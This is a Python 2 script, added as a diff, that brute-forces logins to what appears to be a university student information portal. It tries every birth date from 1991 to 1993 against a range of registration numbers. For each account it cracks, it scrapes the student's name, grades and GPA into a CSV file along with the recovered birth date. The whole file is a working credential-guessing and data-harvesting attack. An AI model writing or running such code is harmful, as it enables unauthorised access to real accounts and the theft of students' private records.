@@ -1,0 +1,173 @@
+from mechanize import Browser
+import thread
+from bs4 import BeautifulSoup,SoupStrainer
+
+def validate(br, bday, reg):
+    br.select_form(name="loginform")
+    # Browser passes through unknown attributes (including methods)
+    # to the selected HTMLForm (from ClientForm).
+    #br["cheeses"] = ["mozzarella", "caerphilly"]  # (the method here is __setitem__)
+    br["idValue"] = str(reg)
+    br["birthDate"] = bday
+
+
+    response = br.submit()
+    soup = BeautifulSoup(br.response().read())
+    soup = BeautifulSoup(soup.prettify())
+    # divTag = soup.find_all("div", {"class":"nav-collapse collapse"})
+    # divTag = soup.find_all("ul", {"class":"nav top-2"})
+
+    for link in soup.find_all('a'):
+        x = link.string
+        y = str(x).strip()
+        if y == "Student Profile":
+            return "valid"
+        else:
+            return "invalid"
+
+def iterateOver(br, reg):
+    for i in range (1991, 1993):
+        for j in range (1, 13):
+            for k in range(1, 32):
+                # print k, "  ", j, "  ", i
+                if i== 1993 and j >6:
+                    return "invalid"
+                if i==1991 and j<4:
+                    j=5
+                print (str(i)+"-"+str(j)+"-"+str(k)), "  ", reg
+                if k<10:
+                    k="0"+str(k)
+                if j < 10:
+                    j="0"+str(j)
+                if validate(br, (str(i)+"-"+str(j)+"-"+str(k)), reg) == "valid":
+                    bday= str(i)+"-"+str(j)+"-"+str(k)
+                    print bday, "  ", reg
+                    return bday
+    return "invalid"
+        # print validate(br, ("1993-01-"+str(i))), "  ", i
+# print br
+
+def writeGPA(br, f, reg, bday):
+
+    # <ul class="loginbar pull-right">
+    soup = BeautifulSoup(br.response().read())
+    soup = BeautifulSoup(soup.prettify())
+    # divTag = soup.find_all("div", {"class":"nav-collapse collapse"})
+    # divTag = soup.find_all("ul", {"class":"nav top-2"})
+    s=""
+    for link in soup.find_all('li'):
+        s += link.string
+        # s= str(s)
+        # s=u' '.join((s,"")).encode('utf-8').strip()
+        s=s.strip()
+        print s
+        s= s[10:] + ", "
+        s=s[1:]
+        print s
+        break
+
+        # print link.has_attr['li']
+
+    check1 = 0
+    for link in br.links():
+        # print link.text, link.url, check1
+        if check1 == 1:
+            request = br.click_link(link)
+            # print request.read()
+            br.open(request)
+            # print br.response().read()
+            soup =BeautifulSoup(br.response().read())
+            # print "\n\n\n\n\n\n"
+            # print soup.prettify()
+            # print "\n\n\n\n\n\n"
+            # for link in soup.find_all('span'):
+            #     print(link.get('id'))
+
+            # soup.span['class']
+            #string s to store
+            # s=""
+            for i in range(24,39, 2):
+                s = soup('span')[i].string+ ", " + s
+                # print s
+            s= s[:-1]
+            s= s.replace('\n', ' ').replace('\r', ' ')
+            # s=s+", "+reg+", "+str(bday)
+            reg=reg%100000
+            reg = str(reg)
+            s=u' '.join((s,reg+" ,", bday)).encode('utf-8').strip()
+            f.write(u' '.join((s,"")).encode('utf-8').strip())
+            f.write("\n")
+
+            return
+        check1=check1+1
+    return;
+
+
+
+
+br = Browser()
+br.open("http://websismit.manipal.edu/websis/control/main/")
+print br.response()
+reg = 100911513
+while reg < 100911700:
+    bday = iterateOver(br, reg)
+    if bday == "invalid":
+        print "\n\n\n", "regchange  ",reg, "\n\n\n"
+        reg+=2
+    else:
+        f = open('gpa_IT.csv','a')
+        # python will convert \n to os.linesep
+        writeGPA(br, f, reg, bday)
+        f.close()
+        reg+=2
+        print "\n\n\n", "regchange  ",reg, "\n\n\n"
+        br = Browser()
+
+        # choice = raw_input('continue?')
+        # if choice == "1":
+        #     break
+        # else:
+        f = open('gpa_IT.csv','a')
+        br.open("http://websismit.manipal.edu/websis/control/main/")
+
+
+
+
+
+# br.select_form(name="loginform")
+#     # Browser passes through unknown attributes (including methods)
+#     # to the selected HTMLForm (from ClientForm).
+#     #br["cheeses"] = ["mozzarella", "caerphilly"]  # (the method here is __setitem__)
+# br["idValue"] = "100911407"
+# br["birthDate"] = "1993-01-15"
+#
+#
+# response = br.submit()
+# soup = BeautifulSoup(br.response().read())
+# soup = BeautifulSoup(soup.prettify())
+# # divTag = soup.find_all("div", {"class":"nav-collapse collapse"})
+# # divTag = soup.find_all("ul", {"class":"nav top-2"})
+#
+# for link in soup.find_all('a'):
+#     x = link.string
+#     y = str(x).strip()
+#     if y == "Student Profile":
+#         print "valid"
+#     else:
+#         print "invalid"
+#     break
+#
+#
+#
+# # print BeautifulSoup(divTag.prettify())
+# # divT = divTag.find_all("a")
+# # print divT
+# # for link in BeautifulSoup(divTag, parseOnlyThese=SoupStrainer('a')):
+#
+# # print divTag
+#
+#
+#
+# # for link in divTag:
+# #     # divT = soup.find_all("a")
+# #     print link
